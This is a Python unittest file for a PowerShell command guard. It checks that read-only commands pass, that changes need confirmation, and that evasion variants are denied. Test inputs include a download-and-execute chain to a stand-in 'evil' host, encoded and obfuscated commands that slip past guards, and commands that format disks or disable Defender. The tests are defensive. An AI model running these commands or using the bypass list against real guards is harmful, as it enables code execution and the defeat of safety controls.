# -*- coding: utf-8 -*-
"""OpsGuard C2 黄金测试 -- Python 标准库 unittest, 零第三方依赖."""
import unittest
import ast_guard
import policy
import diagnose as diag
import generate as gen

BT = chr(96)  # 反引号

# 调研报告-阶段A 实测的全部深层绕过变体; 一律 deny.
DEEP_BYPASSES = [
    ("param 参数缩写 -Stat", "Set-Service -Name Spooler -Stat Running"),
    ("停止解析符 --%", "Get-Service -Name Spooler --% -foo bar"),
    ("动态命令名 & $var", "& $n -Name Spooler"),
    ("脚本块内命令", "& { Get-Service -Name Spooler }"),
    ("Alias 覆盖 gs", "gs -Name Spooler"),
    ("Invoke-Expression", 'Invoke-Expression "Get-Service"'),
    ("iex 缩写", "iex Get-Service"),
    ("下载执行链", "Invoke-WebRequest http://evil/p | iex"),
    ("EncodedCommand 长", "powershell.exe -EncodedCommand ZZZ"),
    ("enc 缩写", "powershell.exe -enc ZZZ"),
    ("反引号转义", "Get-Service -Name Spo" + BT + "oler"),
    ("字符串拼接动态命令名", '& ("Ge"+"t-Service") -Name Spooler'),
    ("多命令分隔夹禁止命令", "Get-Service -Name Spooler; Remove-Service X"),
    ("子表达式命令参数", "Get-Service -Name (Get-Content C:\\x.txt)"),
]


class TestTriState(unittest.TestCase):
    def test_allow_readonly_cases(self):
        for cmd in ["Get-Service -Name Spooler",
                    "Get-DnsClientServerAddress -InterfaceIndex 12",
                    "Get-NetAdapter -Name Ethernet",
                    "Get-WinEvent -LogName System -MaxEvents 20",
                    "ipconfig /all"]:
            with self.subTest(cmd=cmd):
                self.assertEqual(ast_guard.validate(cmd)["verdict"], ast_guard.ALLOW_READONLY)

    def test_require_confirm_cases(self):
        for cmd in ["Set-Service -Name Spooler -Status Running",
                    "Set-DnsClientServerAddress -InterfaceIndex 12 -ServerAddresses 192.168.1.1"]:
            with self.subTest(cmd=cmd):
                self.assertEqual(ast_guard.validate(cmd)["verdict"], ast_guard.REQUIRE_CONFIRM)

    def test_deny_plain_cases(self):
        for cmd in ["Remove-Service -Name Foo", "Format-Volume C", "Get-Process", "whoami /all"]:
            with self.subTest(cmd=cmd):
                self.assertEqual(ast_guard.validate(cmd)["verdict"], ast_guard.DENY)

    def test_result_has_reason_and_node(self):
        for cmd in ["Get-Service -Name Spooler", "Set-Service -Name Spooler -Status Running",
                    "Remove-Service -Name Foo"]:
            r = ast_guard.validate(cmd)
            self.assertTrue(r["reason"])
            self.assertTrue(r["matched_node"])


class TestDeepBypass(unittest.TestCase):
    def test_all_deep_bypasses_denied(self):
        for label, cmd in DEEP_BYPASSES:
            with self.subTest(label=label, cmd=cmd):
                self.assertEqual(ast_guard.validate(cmd)["verdict"], ast_guard.DENY, label)

    def test_syntax_error_fail_closed(self):
        for cmd in ["Get-Service -Name '", "Get-Service ((", "", None, "   "]:
            with self.subTest(cmd=cmd):
                self.assertEqual(ast_guard.validate(cmd)["verdict"], ast_guard.DENY)


class TestForbiddenList(unittest.TestCase):
    def test_forbidden_denied_even_with_confirm_yes(self):
        for cmd in ["Remove-Service -Name Foo", "Format-Volume C", "Remove-LocalUser -Name X",
                    "Set-MpPreference -DisableRealtimeMonitoring 1"]:
            g = ast_guard.validate(cmd)
            self.assertEqual(g["verdict"], ast_guard.DENY)
            d = policy.decide(g, "y")  # 用户确认路径下仍拒
            self.assertEqual(d["decision"], policy.DENY)
            self.assertFalse(d["executed"])


class TestConfirmGate(unittest.TestCase):
    def setUp(self):
        self.g = ast_guard.validate("Set-Service -Name Spooler -Status Running")

    def test_default_no_answer_is_confirm_required(self):
        self.assertEqual(policy.decide(self.g)["decision"], policy.CONFIRM_REQUIRED)
        self.assertEqual(policy.decide(self.g, "")["decision"], policy.CONFIRM_REQUIRED)

    def test_default_n_and_junk_are_not_confirmed(self):
        for ans in ["n", "N", "no", "skip", "yolo", "1"]:
            with self.subTest(ans=ans):
                self.assertEqual(policy.decide(self.g, ans)["decision"], policy.CONFIRM_REQUIRED)

    def test_only_strict_yes_confirms(self):
        for ans in ["y", "yes", " YES "]:
            with self.subTest(ans=ans):
                self.assertEqual(policy.decide(self.g, ans)["decision"], policy.CONFIRMED)

    def test_no_skip_no_auto_execute(self):
        # 确认门不存在"跳过"参数; 任何非严格 y/yes 都不通过, 且 executed 永远 False.
        for ans in [None, "n", "y", "--force", "skip"]:
            d = policy.decide(self.g, ans)
            self.assertFalse(d["executed"])

    def test_readonly_passes_without_confirm(self):
        g = ast_guard.validate("Get-Service -Name Spooler")
        self.assertEqual(policy.decide(g)["decision"], policy.ALLOW)

    def test_deny_never_passes_gate(self):
        g = ast_guard.validate("Remove-Service -Name Foo")
        ok, d = policy.confirm_gate(g, "y")
        self.assertFalse(ok)
        self.assertEqual(d["decision"], policy.DENY)


class TestChain(unittest.TestCase):
    def test_diagnose_to_generate_to_guard(self):
        for sc in diag.VALID_SCENARIOS:
            d = diag.diagnose(diag.sample_evidence(sc), sc)
            self.assertTrue(d["findings"])
            proposals = gen.generate(d)
            self.assertTrue(proposals)
            for p in proposals:
                with self.subTest(sc=sc, cmd=p["command"]):
                    self.assertIn(p["plain_english"], p["plain_english"])
                    g = ast_guard.validate(p["command"])
                    self.assertIn(g["verdict"], (ast_guard.ALLOW_READONLY, ast_guard.REQUIRE_CONFIRM))
                    self.assertIn("--- 当前", p["diff"]["unified"])

    def test_risk_sorted(self):
        d = diag.diagnose(diag.sample_evidence("inspection"), "inspection")
        order = [f["risk"] for f in d["risks_sorted"]]
        self.assertEqual(order, sorted(order, key=lambda x: {"high": 0, "medium": 1, "low": 2}[x]))


if __name__ == "__main__":
    unittest.main(verbosity=2)
